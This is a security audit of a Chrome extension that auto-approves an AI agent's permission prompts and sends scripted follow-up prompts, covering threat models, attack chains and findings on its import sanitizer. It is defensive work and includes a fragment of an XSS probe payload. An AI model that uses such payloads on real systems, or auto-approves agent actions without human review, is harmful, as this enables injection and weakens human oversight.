# SECURITY V19 AUDIT — Muse Auto-Allow, frozen revision v1.9.1

> **Lane:** SECURITY & PAID GO-LIVE ROUND — **AUDIT ONLY** (read-only; no fix in this lane).
> Charter: `docs/SECURITY_PAID_GO_LIVE_ROUND.md` (S0–S15 map). Prompt: `docs/SGPS_SECURITY_PAID_v1.6_ROUND_PROMPT.md`.
> This document is the audit; remediation + independent re-attack are separate lanes (S12/S13).
> **S12 REMEDIATION (separate lane):** F-V19-1 (MEDIUM) and F-V19-2 (LOW) are **FIXED** at the
> post-fix revision — see the status + proof in §9 and the gate re-run / falsifications in §10.1.
> The audit's own findings and evidence below are unchanged.
> **S13 INDEPENDENT RE-ATTACK (separate lane, maker ≠ judge, OWN probes):** re-attacked at the
> post-fix revision `10e0e07` (see §13). Re-bound verdicts: **F-V19-1 = PARTIALLY_FIXED** (the
> whitelist lag IS closed, but a crafted file now **CLEARS** stored restrictions → NEW
> **F-V19-5 (MEDIUM)**), **F-V19-2 = PARTIALLY_FIXED** (the reported alias blind spot is closed;
> the fetch-family class is still evadable), + NEW **F-V19-6 (LOW)**. §9/§10.1 keep the S12
> claims verbatim; §13 is the re-attack evidence.
> **S12b REMEDIATION ROUND 2 (separate lane):** at the amended revision `50436cb` the S13 findings
> **F-V19-5 (MEDIUM)** and **F-V19-6 (LOW)** are **FIXED**, and the zero-network gate is hardened
> for the realistic network forms S13 listed (§14 = status + proof + falsifications). The container
> emission now drops an all-rejected/empty container AND the three composite containers are merged
> at **sub-key granularity** with what is stored, so a crafted/partial file can never make the
> engine's effective setting looser than the stored one (asserted on the ENGINE's post-boot values).
> The S13 revision `10e0e07` was **AMENDED to `50436cb`** (identical `extension/**` blobs — §13.0).
> **Prior evidence is PRIOR EVIDENCE ONLY** (redteam v1–v4, the v1.6/v1.7 security rounds). Every
> previously-closed finding is **re-attacked at THIS revision** (§8); no old PASS is re-cited as fresh.

---

## 0. REVISION BINDING (S1)

| Item | Value |
|---|---|
| Repo | `C:/00. AI Project/PRJ_AutoAllowMUSE` (public), branch `main`, clean tree |
| **HEAD (frozen)** | `9e6b151d150a62641e09295849a92cadbaa3f3cf` — "docs(release): v1.9.1 packet sync…" |
| Freeze commit | `6187606` (tag **`v1.9.1`**); HEAD is the packet-sync doc commit on top of it (no `extension/**` change) |
| Artifact | `dist/muse-auto-allow-v1.9.1.zip` — **180,069 bytes**, sha256 `eec91d1d8f16005e2f34a748145d7a7d32c04b7d85f8ada267255fdb0ac8d1d8` (matches the frozen hash; on-disk `sha256sum` re-run) |
| Evidence classes | `SOURCE_REVIEWED` · `AGENT_REPORTED` · `INDEPENDENTLY_VERIFIED` · `RUNTIME_VERIFIED` · `NOT_VERIFIED` |

### 0.1 sha256 of the reviewed files (frozen @HEAD)

```
extension/content.js                92fc55638020dfa9d3a702a4eec6b18c12a41527353a10462314c0fb32ab2eb1
extension/background.js             50ef89011f64f2f059b13e505b6d7155bd370775ab10ee0a6233bc4d05b2e1fc
extension/popup.js                  0aca892942b3d8f7e775b340d471928e7df3c25a134fbe1df42f4900e75982ea
extension/stats.js                  a47da7aa8b7b83c13a073eaede9c97ef73dd9a992d859eab03e3eaea3aa53543
extension/popup.html                35d945ad1e7472c37fc608dfd132b53ce6d073045c0e3aa1735b00efa8a29c59
extension/stats.html                ad64f89b5f394011cdf27729343d19b01b30e500e165a9bf3c8f4ccec6423747
extension/manifest.json             1a993e3109d196c1f891c232d76c5c1f8cae4f82dfe4b89a752cd37d1f7e8242
extension/_locales/en/messages.json 6fea4b73aab4e044952bbc07c4db5e2a3d7d04ed8f8d8f49871a29d49d731a46
extension/_locales/{vi,zh_CN,ja,ko,es}/messages.json  (6 files — see git)
scripts/lint.mjs                    b27792c1e635a502a87a91f64a9d3daeb127c66eb4d319ae8fb66d296427eecd
scripts/verify-zip.py               84f753e5db88a01ee52e7769e4fd88fb2f4cfa70cc039111a41bd5db5b831660
test/e2e.mjs                        db4e2933fc601e15d23c5d5ed95b2a32956d9c3f16613be6c9b796aba10c2ab4
test/followup-e2e.mjs               a550908665c036557ed648f07f49357ad06e34172ae8a0cdb342f5b796447444
test/mission-e2e.mjs                d074eb8a374e63b176a1c3069881188bd95d491a9ed37998205e9640c8573e36
test/lang-switch-e2e.mjs            992e8d751f7bb7af58b19c4e8e26bc680c5e8bbb934cef6d1bcf4686492a3654
test/background-unit.mjs            ae8474bad9d750c4cd479f6f3ad7c297271940b8d9cd5f980a7b9e4021a71aec
test/import-security.mjs            3a80756d7854fb3b35a053f6f39453205e6422ee1841a9b9c0f9ed68a114f240
```

`DISCOVERED_ON` = `9e6b151`. This lane writes nothing else; `FIXED_ON`/`VERIFIED_ON` are for the
remediation/re-attack lanes.

---

## 1. LIVE TRUTH SNAPSHOT

- **What it is:** a Chrome **MV3** extension that auto-clicks Muse's approval "Allow" on
  `muse.ai` (delegated approval, in the user's own session), plus an **auto follow-up engine**
  (v1.6/v1.7: type+submit prompts on idle), a **v1.8 authority surface** (pause / dry-run / rules
  / smart follow-up / schedule / settings-sync mirror / digest notification / language switcher),
  and — **NEW in v1.9** — the **Mission Orchestrator** (a stateful sequence of *shipped* prompts
  sent into the session, `missionEnabled` + `mission{id,step,cycles,…}`, caps 12 steps / 3 cycles).
- **Zero backend, zero deps, zero network** (see §6). All state in `chrome.storage.local`
  (+ opt-in `chrome.storage.sync` settings subset). Permissions: `storage`, `alarms`,
  `notifications`; host pinned `https://muse.ai/*` + `https://*.muse.ai/*`; CSP
  `script-src 'self'; object-src 'self';`; `all_frames:true`; no `web_accessible_resources`; no
  `externally_connectable`. **`SOURCE_REVIEWED` + `RUNTIME_VERIFIED`** (manifest read; loaded in
  real Chrome by the suites).

---

## 2. S2 — THREAT MODEL REGEN (at v1.9.1)

Authority surfaces **new since the v1.7 model** (the model in `docs/SECURITY_AUDIT_DRAFT.md` §2):
the v1.8 pause/dry-run/rules/smart/schedule surface, the settings-sync mirror, the digest
notification, the language switcher's same-package locale read, and the **v1.9 Mission
Orchestrator** (a *send-authority* state machine holding durable state). `THREAT_MODEL_REGEN_REQUIRED = TRUE` (done).

| ASSET | ENTRY | ATTACKER CONTROL | TRUST BOUNDARY | AUTHORITY CHANGE | EFFECT | DETECTION | RECOVERY |
|---|---|---|---|---|---|---|---|
| Click authority (allow) | muse.ai DOM (`all_frames`) | page content (incl. frames) | DOM(lower) → heuristics → `btn.click()` | grant approval as the user | approval granted / mis-click | rails + encrypted log | toggle OFF; review log; Muse-side revoke |
| **Send authority — follow-up** | composer + status DOM | page (trigger); storage (text) | storage(prompt)+DOM(trigger) → type/submit | send a message as the user | message sent; agent continues | verify composer + caps + log | disable follow-up; cooldown 10 m / 6 h cap |
| **Send authority — Mission (v1.9)** | same composer path; `mission`+`missionEnabled` in storage | page (idle trigger); storage (mission object) | **shipped corpus (text)** + storage(which mission/step) → send | send the *next plan step* as the user | a sequence of shipped directives sent; durable mission state | `mission`/`mission-dry` log kind; caps 12/3 | clear `mission`; toggle `missionEnabled`; pause |
| Settings-sync mirror | `chrome.storage.sync` | Chrome account sync data | local↔sync (Google) | change settings subset on other devices | follow-up prompt/rules change cross-device | console warn on quota/failure | turn sync off; clear sync data |
| At-rest data (log/context/key) | `storage.local` + backup file | profile access / crafted file (user-mediated) | disk/file → extension | read/write/rotate key, log | read context / corrupt data | AES-GCM; sanitizer | restore backup; clear storage |
| Locale file read | `_locales/<id>/messages.json` (same package) | none (fixed id list) | package → popup | render localized strings | — | fixed `LOCALE_IDS` validation | — |
| Digest notification | `chrome.notifications` on startup | local counters | local → OS | show one transient notification | info leak to shoulder-surfer (bounded) | local compose only | — |
| Update channel | CWS / unpacked dir | publisher compromise | pipeline → browser | full extension authority | any in-scope click/type/read | CWS review; lint; zip hash | reinstall from clean source |
| Rate/resource | DOM flood / large import | page / file | caps + quota | (none) | CPU/storage burn | caps; quota | clear storage |
| Multi-frame | iframes on muse.ai | page frames | `all_frames` → N instances | multiply clicks/sends | amplified but bounded | per-instance caps | — (accepted F4) |

**New-chain note (v1.9):** the mission *state* is durable (`mission` in storage) and *drives send
authority* — so the threat model now has a **persistent** send-authority object, unlike the
transient phrase rotation. Tamper-resistance of that object is the new S3-G question (§3-G).

---

## 3. S3 — ATTACK CHAINS A–I (re-attacked at `9e6b151`)

Legend: **SAFE** = the rails hold under the probe; **BOUNDED** = residual accepted; **NOT_VERIFIED**
= not executed. `FINANCIAL IMPACT = none` for every chain (§7).

### Chain A — Page-content trickery vs the auto-clicker — **SAFE** (`RUNTIME_VERIFIED`)
- **Objective:** make the extension click a non-approval UI (destructive/consent/navigation/form).
- **Controlled surface:** DOM of any `muse.ai`/`*.muse.ai` origin, incl. frames (`all_frames`).
- **Probe / evidence:** `node test/e2e.mjs` → **exit 0**, `ok:true`, `forbiddenHit: []`,
  `denyCount: 0`, `connectorCheck.ok:true` (`blockedConnector:2`), `dupes:[]`, `n7count:1`,
  `n11count:1`, `orderOk:true`, `dedupSepOk:true`. The 13 expected clicks landed; every
  never-click id (lone Allow, notification card `19`, split-container, hidden/disabled deny,
  opacity:0, form-bound, destructive surface buttons, connector card `20`, `lone-connect`) was
  **not** touched. **`RUNTIME_VERIFIED`** (real Chrome, scratch profile).
- **Rails (frozen):** adjacent-pair + clickable deny; skip anchor/form; consent-card block
  (`PERMISSION_CARD_RE` wins absolutely — OB-1 fix intact); destructive-verb filter; connector
  hard-block (`connectorIn`, 2-ancestor climb); visibility; fingerprint dedup 5 s; 30/min allow
  cap; one-allow-per-card; liveness.
- **Remediation:** none at this revision. **Residual:** heuristic arms-race, bounded by caps +
  rails (accepted R8–R11).

### Chain B — Approval-text XSS (log → popup/stats; import path) — **SAFE** (`INDEPENDENTLY_VERIFIED`)
- **Objective:** run script in the extension page context via a log/label/context/reason string.
- **Controlled surface:** any string reaching a render sink — approval text, `kind`, `label`,
  `blockedReason` (v1.8), `mission.id`/`step`/`cycle` (v1.9), the new **aria-label** path, and a
  crafted import file.
- **Probe (independent, this lane):** `probe_xss_v19.mjs` runs the **REAL** `esc()`/`renderLog()`
  extracted verbatim from frozen `popup.js` (`sha 0aca8929…`) against 10 payload entries incl. the
  new `mission`, `mission-dry`, `blocked` kinds, malicious `blockedReason` (`keyword:"><img …>`),
  malicious `mission.id`, and `null`/number/string junk entries → rendered HTML validated with a
  **spec-faithful Python `html.parser`**: **tags = {b,div,span}, 0 dangerous tags, 0 `on*`
  handlers, 0 `javascript:` URLs → CLEAN.** The `stats.js` topic render (`title`→`&quot;`, text
  strips `[<>&]`) validated the same way → CLEAN. `renderLog` also survived the `null`/primitive
  entries without throwing (V4-3 stays fixed). **`INDEPENDENTLY_VERIFIED`.**
- **Sinks:** 6 `innerHTML` in popup.js / 3 in stats.js — every interpolation `esc()`-wrapped or
  numeric; no `outerHTML`/`insertAdjacentHTML`/`document.write`; no inline handlers; CSP
  `script-src 'self'`.
- **Remediation:** none. **Residual:** DOM-clobbering via `innerHTML` — **NOT_VERIFIED** (not
  probe-tested; esc() prevents element creation from data, so only a pre-existing clobbering sink
  could matter, and none is reachable).

### Chain C — Crafted backup import — **BOUNDED** (`INDEPENDENTLY_VERIFIED`; one MEDIUM finding)
- **Objective:** (a) rotate the at-rest key to an attacker-known key; (b) corrupt log/stats; (c)
  change settings; (d) inflate storage.
- **Controlled surface:** a backup file the user picks + `confirm()` (no `externally_connectable`;
  file picker needs a user gesture).
- **Probe (independent):** `probe_import_v19.mjs` runs the **REAL** `sanitizeBackup` +
  `resolveImportedKey` + `testBackupKey` extracted verbatim from frozen `stats.js`
  (`sha a47da7aa…`) with real WebCrypto → **13/13 PASS**:
  - key rotation **refused** when a supplied key has no ctx-bearing entry (classic SA-1 shape);
  - **adopted** only after decrypt proof against *any* ctx entry; **whole import rejected** on
    proof failure (fail-closed);
  - `clickCount` 1e308 → **1e7**; a 300k-char `at` **dropped** (only ISO survives);
  - `__proto__` not an own key; `Object.prototype` not polluted; unknown keys + malformed
    `cryptKeyRaw` dropped.
- **New (v1.9) — see §9 F-V19-1:** the sanitizer whitelist has **not** kept pace with the storage
  keys — a backup carrying `pauseUntil`/`dryRun`/`allowOnceMode`/`rules`/`followupSmart`/
  `followupSchedule`/`syncSettings`/`missionEnabled`/`mission`/`userLocale`/`onboarded` silently
  **drops all of them**; a file of *only* those is reported **"Not a backup file."**
- **Residual:** SA-1 R-1 (a *self-consistent* crafted file still rotates the key — by-design
  limit, no signing); V4-2 merge/race (accepted). **Remediation:** §9 F-V19-1 (extend whitelist).

### Chain D — Local storage tampering (other extension / user / malware profile) — **BOUNDED / ACCEPTED**
- **Objective:** read/modify the extension's storage; change behaviour incl. the **new mission keys**.
- **Controlled surface:** the Chrome profile on disk / devtools. Another extension cannot reach
  this extension's storage (Chrome isolation). A local attacker with profile write already holds
  the OS-user boundary.
- **Probe (independent):** `probe_mission_v19.mjs` feeds **tampered `mission` objects** through the
  **REAL** `sanitizeMission`/`applyMissionSettings` extracted verbatim from frozen `content.js`
  (`sha 92fc5563…`) → **18/18 PASS**: `step` 999/1e308/-5/"3" all clamp to `[0, L-1]`; `cycles`
  999/1e308 clamp to `≤3`; an **unknown/blank id ⇒ no mission (fail-closed)**; `missionEnabled`
  must be **strictly `=== true`** (the string `"true"` does not enable).
- **Conclusion:** a tampered mission **cannot bypass the 12/3 caps** (§3-G) and cannot inject text
  (§3-G). Tampering can only *start* a mission (within the user's own profile) — same boundary as
  R10-lineage accepted. **`INDEPENDENTLY_VERIFIED` (source-level) + `NOT_VERIFIED`** for a real
  malware-profile simulation (unsafe/unnecessary).
- **Residual:** ACCEPTED (R10 lineage; the AES-GCM key sits in the same profile — "casual
  inspection" only, per the code comment).

### Chain E — Compromised update channel (unpacked dir / CWS) — **BOUNDED / ACCEPTED**
- **Objective:** push malicious code into the extension → inherit full authority.
- **Controlled surface:** CWS account / local unpacked dir.
- **Evidence:** zero deps (§6), lint gate, `verify-zip.py` byte-verify. **No code-signing beyond
  CWS default; unpacked install = the user's own machine trust** (see §6 residual).
- **Probe:** not executable (would require compromising the channel). **`NOT_VERIFIED`** by design;
  this is control inventory, not a test.
- **Remediation (owner TODO):** CWS 2FA; verify the zip hash before upload (`store/PUBLISH_RUNBOOK.md`);
  install unpacked only from a trusted source.

### Chain F — Delegated-approval impersonation (CORE accepted risk) — **ACCEPTED (mitigations re-verified)**
- **Objective:** let the extension auto-approve requests an attacker queued in the user's account.
- **Preconditions:** Muse account/session compromised + extension ON (default ON) + tab open.
- **Re-verification at this revision:** rails bind (`RUNTIME_VERIFIED` via e2e — one click per node,
  cap 30/min, dedup, never Deny, log). The extension **cannot** distinguish a genuine approval
  from a forged one — that is the nature of auto-allow.
- **Mitigations (present):** visible toggle; audit log (context + `at`, encrypted at rest, cap 50);
  rate cap; never-Deny; pause (`Alt+Shift+P` / 15 min); schedule; blocklist/topic rules; connector
  hard-block; `dryRun`; **logging-only-by-default on a fresh install (v1.9.3 — see below)**.
- **Remediation (owner decision) — IMPLEMENTED in v1.9.3 (informed consent):** the owner approved
  "a fresh install starts in dry-run (logging-only) so the user sees exactly what would be clicked
  before granting live approval authority". Shipped as: `background.js` `migrate()` seeds
  `dryRun: true` when the key is ABSENT (never overwriting an explicit choice), the onboarding
  wizard's step 2 states the logging-only default plainly, shows the live
  "Logging only — nothing will be clicked" state, offers the one-tap **"Turn on live clicking"**
  (an explicit `dryRun:false`), and carries the consent line "This tool grants approvals in your
  name — you stay responsible for what your agent does." (`onbConsent`, all 6 locales). The
  "turn OFF when unattended" advice stays in the listing/privacy. **Muse-side session security is
  out of scope.**
- **Residual:** ACCEPTED — unchanged (R8–R11; R11 = this chain). This revision adds informed
  consent; it does **not** change the accepted risk.
- **Open finding (honest note, 2026-10-12):** the new end-to-end proof (`test/e2e.mjs` dry-run
  pre-phase) shows the engine applies `dryRun` AFTER its first sweep — with `dryRun:true` stored,
  a page load can leak ONE live click before the flag lands (boot-order race in
  `content.js`; v1.8/v1.9 carried the same window for opt-in dry-run). The pre-phase therefore
  exits RED on the shipped engine, and the packet reports it instead of claiming a mitigation it
  cannot yet prove. Root cause, the 4-line fix and its validated proof are in
  `docs/ENGINE_V18.md` §14.4; the fix is **pending** because `content.js` is outside this packet's
  write set (and its hash is pinned above). Until it lands, treat "a fresh install clicks nothing"
  as true for every sweep after the first one on each page load, not for the first sweep.

### Chain G — Send-authority abuse via Mission + follow-up — **SAFE / BOUNDED** (`INDEPENDENTLY_VERIFIED` + `RUNTIME_VERIFIED`)
- **Objective:** steer **which** prompt is sent, the **timing**, or the **count past the caps** via
  page content or tampered storage.
- **Which prompt?** — **page content cannot steer it.** `missionSendOverride()` returns
  `missionStepText()` = `missionStepsOf(mission.id)` = a **shipped corpus step**; the follow-up
  path sends `followupActiveText()` = `followup.prompts[rotateIdx]` / `followupPrompt` from
  **storage** (user-set), never page text. Probe `probe_mission_v19.mjs`: the override text is a
  shipped step; `mission-e2e` case A: the send carries the **exact shipped step 0**.
- **Timing?** — page DOM controls *idle detection* (the trigger) — by design; bounded by
  cooldown + rolling-hour cap + `followupSchedule` + `pauseUntil` + approval-present guard
  (absolute priority). **`RUNTIME_VERIFIED`** (`mission-e2e` B2/C; `followup-e2e` case (e)).
- **Count past the caps?** — **No.** `sanitizeMission` clamps stored `step`/`cycles` (probe,
  §3-D); `missionOnVerifiedSend` completes at `cycles*L+step ≥ 12` **or** `cycles ≥ 3`
  (`mission-e2e` case E: exactly **12 sends / 3 cycles**, then a **silent stop** with one
  completion entry and no further send; falsification F2 widens the caps → RED). Advance happens
  **only on a verified send** (F1 falsification → RED).
- **Gate:** a mission send requires `followupEnabled` **and** `missionEnabled` **and** an active
  mission; `missionEnabled` defaults **false**; the corpus is shipped/English/reviewed; the
  `mission-e2e` preflight safety scan flags **0** destructive/secret/URL markers in all 18 steps
  (with positive + negative controls).
- **Residual:** (i) the rolling-hour cap and the mission caps are **per content-script instance**;
  with `all_frames:true` a page that renders the composer + idle status in **N** frames could in
  principle multiply sends up to N×12 — the same per-frame limitation already accepted as **F4**
  for the follow-up cap (`SOURCE_REVIEWED`; multi-frame multiplication **NOT_VERIFIED**). (ii) a
  false idle-positive costs one paced prompt (bounded). **Remediation:** none; optional per-extension
  (not per-frame) budget if Muse ever ships multi-frame chat.

### Chain H — Rate-cap / resource abuse — **SAFE / BOUNDED** (`SOURCE_REVIEWED` + `RUNTIME_VERIFIED`)
- **Objective:** force continuous clicks/logs or inflate storage.
- **Evidence:** e2e cap behaviour green; `mission-e2e`/`followup-e2e` caps green; import caps
  verified (50 log, 500 keys/bucket, clamp 1e9, `at ≤64`, `clickCount ≤1e7`); storage headroom
  ample. Liveness guard + Web Locks serialization + write merge (v1.8 §12.3) present.
- **Residual:** multi-frame per-instance budget (F4); a huge crafted file stalls parse (self-DoS,
  user-mediated + confirm). LOW.

### Chain I — Reliability adversary (fail-open vs fail-closed under odd DOM) — **BOUNDED**
- **Objective:** force a wrong click (fail-open) or a TOCTOU mis-click, or paralysis.
- **Evidence (`SOURCE_REVIEWED`):** authority decisions fail-closed — sweep clicks only after all
  rails; `approvalPresent()` catch → **true** (blocks send); `detectMuseState` error → `'unknown'`
  (no send); `findComposer` has no blind fallback; `flushClicks` failures are now **surfaced**
  (`console.warn`, v1.9.1 §13.2); a removed settings key **resets to its shipped default**, never a
  stale value (v1.9.1 §13.1). TOCTOU: `btn.click()` runs on the checked node reference (a detached
  node is a document no-op); re-render races are covered by fingerprint dedup + WeakSet
  (`RUNTIME_VERIFIED`: e2e n7/n11 = 1).
- **NEW v1.8 surface — the adaptive fast-path sweep:** `cardBearingMutation()` schedules a
  card-bearing mutation at `OBSERVER_CARD_MS = 0` (next task) instead of the 120 ms generic
  debounce. **Does it click something the old path would not?** The repo's falsification (§12.4)
  and my re-run show the **same** e2e outcome with the fast path on/off (`n7count:1`,
  `n11count:1`, `denyCount:0`, `forbiddenHit:[]`) — detection is unchanged for the fixture.
  **Residual (INFO, `NOT_VERIFIED`):** the settle window is now ~0 ms for card mutations, so a card
  that renders *and then mutates within the same task* could be evaluated in a transient state;
  no fault-injection probe beyond the fixture was run. Bounded by the click-time rails.
- **Residual:** `isVisible` catch → `true` (a small fail-open, mitigated by the other rails).

### RAILS LIST (frozen @`9e6b151`) — the extension CANNOT click / CANNOT send

**Cannot click:** Deny/Reject/Decline (no deny click path exists); a lone Allow (no clickable deny
in the same container); anything outside `muse.ai` scope; non-`button`/`[role=button]`; disabled/
`aria-disabled`; not visible (size/visibility/display/pointer-events/opacity); inside `<a>` or a
`<form>`; consent-only pairs (notifications/newsletter/subscribe/cookies/marketing/alerts/
reminders/tips **without** approval wording); **permission-card wording** (send notifications/
notifications/camera/microphone/location/clipboard — wins absolutely, OB-1); destructive-verb
surfaces; **any container matching the connector hard-block** (`connectors?` word, Connect-family
button, token wording); Review buttons outside a "needs review" context; past the 5 s dedup; past
the 30/min allow or 30/min aux cap; after extension-context invalidation.

**Cannot send (follow-up / mission):** while `followupEnabled` is off; while paused (`pauseUntil`);
outside the schedule; while a send is in flight; **while an approval surface is present (absolute
priority)**; while the composer already holds text; when no composer/send target is identifiable;
when the verify step fails (composer still holds the text → no retry until cleared); past the
rolling-hour cap; and a mission only sends while `missionEnabled` **and** a mission is active, only
**shipped** step text, advancing **only on a verified send**, stopping at 12 steps / 3 cycles.

---

## 4. S4 — APPSEC SURFACES

| Surface | Result | Evidence class |
|---|---|---|
| Popup/stats XSS (`esc()` coverage incl. the new aria-label + mission/blocked kinds) | **CLEAN** — real `renderLog` + Python parser: only `b/div/span`, 0 handlers, 0 dangerous tags | `INDEPENDENTLY_VERIFIED` |
| CSP | explicit `script-src 'self'; object-src 'self';` (MV3 floor; not widened) | `SOURCE_REVIEWED` |
| No secrets | repo grep for `api key/secret/password/token/bearer/PRIVATE KEY/…` → hits only in the blocklist/consent regex lists, a UI checklist string, and CSS "token" comments; **no credential, no PII** | `SOURCE_REVIEWED` |
| Sensitive local logs | log/context encrypted at rest (AES-GCM-256, random 96-bit IV); `console.warn` is local-only; no PII written | `SOURCE_REVIEWED` + `RUNTIME_VERIFIED` (e2e `encCheck.ok`, `hasPlain:false`) |
| Unsafe file handling (import) | typed whitelist + caps + decrypt-proof + `confirm`; **but the whitelist lags the v1.8/v1.9 keys (F-V19-1)** | `INDEPENDENTLY_VERIFIED` |
| Storage RMW races (Web Locks) | flush serialized per-tab + cross-tab via `maa-record-v1`; **import runs on the extension origin, outside the page lock** (V4-2 accepted) | `SOURCE_REVIEWED` |
| Wrongful grant/denial equivalence | never Deny (`denyCount:0`), never a lone Allow, connector hard-block fires (`blockedConnector:2`) | `RUNTIME_VERIFIED` |

---

## 5. S5 — AI / AGENTIC

This product **is** an agentic tool: `LOWER-TRUST INPUT (page DOM) → DECISION (heuristics) → TOOL
CALL (click/type/submit) → REAL EFFECT (approval granted / message sent)`.

- **Prompt-injection-style DOM trickery:** the *content* of a send is never page-derived (Chain G);
  the *decision* to click/send is page-DOM-influenced by design, bounded by rails (Chain A/I).
  **SAFE / BOUNDED.**
- **Excessive permission:** `all_frames:true` + click authority + (new) send authority. No new
  permissions were added in v1.9 (mission rides the existing follow-up engine); `notifications`
  was added in v1.8 (digest) and is allow-listed by lint. `all_frames` remains the accepted F4
  exception (multi-frame amplification is bounded per instance). **SOURCE_REVIEWED.**
- **Unsafe retries:** sends are paced (cooldown + rolling-hour cap) and verify-gated; a failed
  verify does not retry until the composer is cleared. **SAFE.**
- **Data exfiltration — must stay zero-network:** the extension makes **no network request**; the
  only `fetch`-family call is `readAsset(chrome.runtime.getURL('_locales/…'))` — a **same-package**
  read of a fixed `LOCALE_IDS` entry. **However the lint gate that is supposed to *enforce* this is
  now blind to it (F-V19-2).** No remote URL, no exfil path. **SOURCE_REVIEWED**; gate weakness
  **INDEPENDENTLY_VERIFIED** (§9 F-V19-2).

---

## 6. S6 — SUPPLY CHAIN

- **Zero dependencies — verified, not asserted:** repo-wide `find` for `package.json` /
  `node_modules` / lockfiles → **none**. No npm transitive exposure. **`INDEPENDENTLY_VERIFIED`.**
- **Build from repo scripts only:** `scripts/build.mjs` / `lint.mjs` / `verify-zip.py`; no CI token
  in scope. No remote/`eval`/`new Function`/`importScripts` in `extension/**` (lint §4).
- **Artifact byte-verified:** `python scripts/verify-zip.py` → **`18 matched, 0 mismatched, 0
  disk-only, 0 zip-only`** (exit 0); on-disk `sha256sum` of `dist/muse-auto-allow-v1.9.1.zip` =
  **`eec91d1d…d1d8`** (180,069 B) — matches the frozen hash. **`INDEPENDENTLY_VERIFIED`.**
- **Residual trust:** unpacked-dir install = the user's own machine (Chain D boundary); CWS-default
  provenance only; no reproducible-build/signing beyond that. **ACCEPTED (Chain E).**

---

## 7. S9–S11 — MONEY / PAID: **NOT_APPLICABLE** (evidence-backed)

**State: NOT_APPLICABLE — this revision has no money path.**

- Repo grep across `extension/` for `webhook|ledger|entitle|payment|stripe|payos|checkout|billing|
  subscri|licen[cs]e|purchase|monetiz|price|refund|settlement` → **only** the fail-closed
  `BLOCK_SEED` blocklist and the consent-word regex (not a payment path). **0 payment code.**
- Manifest: no payment/network permission; no provider, webhook, entitlement, ledger, order, price,
  refund or settlement anywhere.
- ⇒ **S9 (money model), S10 (money invariants), S11 (webhook/concurrency/failure injection) =
  NOT_APPLICABLE.** Do **not** manufacture a paid model.
- ⇒ **Paid-path readiness = `NOT_VERIFIED`** (nothing to verify). IF the owner opens a monetization
  path (e.g. a future Pro tier/licensing), **S9–S11 become a mandatory design gate** before any
  build ships a money path: canonical authority per state, replay/dedup/idempotency,
  sandbox/prod isolation, negative tests (charter `docs/SECURITY_PAID_GO_LIVE_ROUND.md`).
- ⇒ The maximum verdict axis for this round: **security assurance for a FREE go-live (+ CONDITIONAL
  items)** — `PAID_GO` is **not** claimable while the paid surface is N/A (S14/S15 rail).

---

## 8. PRIOR FINDINGS — RE-ATTACK AT `9e6b151` (evidence invalidated by the HEAD change)

> Old SHAs do **not** close the new HEAD (S15-S04). Each row is re-derived at this revision.

| Prior finding (old rev) | Status at `9e6b151` | Evidence |
|---|---|---|
| **V4-1** import unvalidated (MED) | **CONFIRMED_FIXED** — typed whitelist + caps + decrypt-proof all bind; residual SA-1 R-1 + **new whitelist-lag (F-V19-1)** | `INDEPENDENTLY_VERIFIED` (probe 13/13) + `test/import-security.mjs` 29/29 |
| **V4-2** import merge semantics + cross-context race | **STILL PRESENT, ACCEPTED** (merge `set(clean)`; import outside the page lock) | `SOURCE_REVIEWED` |
| **V4-3** popup log crash on a `null` entry | **CONFIRMED_FIXED** — `renderLog` filters non-objects; my probe fed `null`/`5`/`"str"` with no throw | `INDEPENDENTLY_VERIFIED` |
| **V4-4** key-cache not invalidated | **CONFIRMED_FIXED** — `storage.onChanged` clears `cryptKey` on `cryptKeyRaw` (content.js:666) | `SOURCE_REVIEWED` |
| **V4-5** first-install key race | **CONFIRMED_FIXED** — re-read + adopt the stored key (content.js:654-660) | `SOURCE_REVIEWED` |
| **V4-6** e2e gap for crypto/import | **CONFIRMED_FIXED** — `encCheck` (schemaVersion 2, `hasCtx`, no plaintext, 44-char key, round-trip) green | `RUNTIME_VERIFIED` (e2e `encCheck.ok:true`) |
| **V4-7** lock-holder stall | **STILL ACCEPTED** (theoretical) | `SOURCE_REVIEWED` |
| **V4-8** `localTime` non-string | **CONFIRMED_FIXED** — `!iso` → `''`; NaN → `''` | `SOURCE_REVIEWED` |
| **SA-1** key rotation without proof | **CONFIRMED_FIXED** — no-ctx ⇒ refuse+keep; any-ctx ⇒ adopt; proof-fail ⇒ reject whole import; residual R-1 (self-consistent file) | `INDEPENDENTLY_VERIFIED` (probe) + import-security 29/29 |
| **SA-2** follow-up config lost on restore | **CONFIRMED_FIXED for the v1.7 `followup*` keys** — round-trips exactly; **REGRESSED-IN-SCOPE for the v1.8/v1.9 keys** → new **F-V19-1** | `INDEPENDENTLY_VERIFIED` |
| **SA-3** dataset bounds + quota message | **CONFIRMED_FIXED** — `clickCount ≤1e7`, `at ≤64` ISO-only, dedicated `importQuota` message | `INDEPENDENTLY_VERIFIED` + import-security |
| **OB-1** consent/notification card auto-clicked | **CONFIRMED_FIXED** — `PERMISSION_CARD_RE` wins absolutely; e2e card `19` in FORBIDDEN, `forbiddenHit:[]`; `mission-e2e`/`followup-e2e` z-checks confirm deny never clicked | `RUNTIME_VERIFIED` |
| **OB-2** pacing (~1 s) | **ACCEPTED** (not a security invariant) | `SOURCE_REVIEWED` |
| **redteam v1–v3** (v1.2.0) | **PRIOR EVIDENCE ONLY** — not re-cited; the v1.2.0 code no longer exists at this revision; the rails they protected are re-verified live in Chains A/I (§3) | — |

**No prior finding is `NOT_VERIFIED` for lack of a probe except V4-7 (theoretical, accepted).**

---

## 9. NEW FINDINGS (this audit, bound to `9e6b151`)

### F-V19-1 — **MEDIUM** · Import sanitizer whitelist lags the v1.8/v1.9 storage keys
- **Class:** import / data-integrity / silent safety-setting loss (SA-2 lineage extended).
- **File:line:** `extension/stats.js:200-246` (`sanitizeBackup`) vs the writers
  `extension/content.js:1569` and `extension/background.js:29-30`; export uses
  `chrome.storage.local.get(null)` at `extension/stats.js:275`.
- **Issue:** `sanitizeBackup` whitelists only `enabled`, `minDelayMs`, `clickCount`, `log`, `stats`,
  the v1.7 `followup*` keys, `cryptKeyRaw`, `schemaVersion`. It has **no** handling for
  `pauseUntil`, `dryRun`, `allowOnceMode`, `rules`, `followupSmart`, `followupSchedule`,
  `syncSettings`, `missionEnabled`, `mission`, `userLocale`, `onboarded` — yet `exportData` writes
  **all** of `chrome.storage.local`. So a restore **silently drops** every v1.8/v1.9 setting and the
  mission state; a backup file containing **only** those keys is reported **"Not a Muse Auto-Allow
  backup file."** (because `seen === 0` → `null`).
